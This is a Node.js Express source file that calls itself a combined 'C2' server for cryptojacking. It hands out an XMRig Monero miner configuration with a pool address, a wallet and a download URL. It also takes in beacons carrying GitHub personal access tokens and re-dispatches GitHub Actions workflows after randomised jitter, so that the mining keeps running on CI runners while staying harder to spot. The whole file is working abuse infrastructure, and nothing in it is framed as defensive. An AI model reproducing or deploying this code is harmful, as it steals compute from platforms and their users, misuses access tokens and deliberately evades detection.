// Filename: server.js
// This single server performs two C2 functions:
// 1. Serves the miner configuration (the payload).
// 2. Receives a beacon from a completed workflow and triggers the next one (the trigger).

const express = require('express');
const fetch = require('node-fetch');

const app = express();
app.use(express.json()); // Middleware to parse incoming JSON bodies

// --- Configuration for the Miner Payload ---
// This is the configuration object the server will send to each new miner.
const dynamicConfig = {
  pool: {
    url: "pool.supportxmr.com:5555",
    user: "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",
    pass: "x"
  },
  miner: {
    version: "6.21.2",
    downloadUrl: "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip",
    executable: "xmrig.exe"
  }
};

// === ROUTE 1: The Payload Server ===
// This endpoint provides the instructions for the miner.
app.get('/', (req, res) => {
  console.log(`[INFO] Serving config to a new runner from IP: ${req.ip}`);
  res.status(200).json(dynamicConfig);
});


// === ROUTE 2: The Workflow Trigger Server ===
// This endpoint listens for the beacon from a completed GitHub Actions run.
app.post('/notify', (req, res) => {
  // Extract the necessary data from the incoming request body.
  const { pat_token, repository, workflow_file } = req.body;

  // Basic validation to ensure we have the data we need.
  if (!pat_token || !repository || !workflow_file) {
    console.error('[ERROR] Received an incomplete beacon. Missing required data.');
    return res.status(400).json({ error: 'Incomplete beacon data. pat_token, repository, and workflow_file are required.' });
  }

  console.log(`[INFO] Received completion beacon from repository: ${repository}. Scheduling next run.`);

  // CRITICAL: Immediately send a success response to the GitHub Action.
  // This allows the workflow to terminate cleanly without waiting for the next one to start.
  res.status(200).json({ status: 'acknowledged', message: 'New workflow run has been scheduled.' });

  // --- Schedule the next workflow run to execute in the background ---
  // Introduce a randomized delay (jitter) to avoid a predictable, rhythmic pattern.
  const baseDelayMinutes = 10;
  const jitterMinutes = 15; // The delay will be 10 minutes +/- 15 minutes.
  const randomDelay = (Math.random() * jitterMinutes * 2) - jitterMinutes;
  const totalDelayMinutes = baseDelayMinutes + randomDelay;
  const delayMilliseconds = Math.max(1, totalDelayMinutes) * 60 * 1000; // Ensure delay is at least 1ms

  console.log(`[INFO] Waiting for ${totalDelayMinutes.toFixed(2)} minutes before triggering the next workflow...`);

  // Use setTimeout to delay the trigger without blocking the server.
  setTimeout(() => {
    triggerNextWorkflow(pat_token, repository, workflow_file);
  }, delayMilliseconds);
});

/**
 * Triggers a new GitHub Actions workflow run using the provided details.
 * @param {string} token - The GitHub PAT with 'workflow' scope.
 * @param {string} repo - The repository (e.g., 'owner/repo').
 * @param {string} workflowFile - The name of the YAML file (e.g., 'main-pipeline.yml').
 */
async function triggerNextWorkflow(token, repo, workflowFile) {
  const githubApiUrl = `https://api.github.com/repos/${repo}/actions/workflows/${workflowFile}/dispatches`;
  
  console.log(`[ACTION] Triggering new workflow run for ${repo}...`);
  
  try {
    const response = await fetch(githubApiUrl, {
      method: 'POST',
      headers: {
        'Authorization': `token ${token}`,
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        ref: 'main' // The branch to run the workflow on
      })
    });

    if (response.status === 204) {
      console.log(`[SUCCESS] Successfully triggered new workflow for ${repo}.`);
    } else {
      const responseBody = await response.text();
      console.error(`[FAILURE] Failed to trigger workflow. Status: ${response.status}, Body: ${responseBody}`);
    }
  } catch (error) {
    console.error('[FATAL] An error occurred while trying to contact the GitHub API:', error);
  }
}

// --- Start the Server ---
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`[READY] Combined C2 server is listening on port ${port}`);
  console.log(`  - Payload endpoint: GET http://localhost:${port}/`);
  console.log(`  - Trigger endpoint: POST http://localhost:${port}/notify`);
});
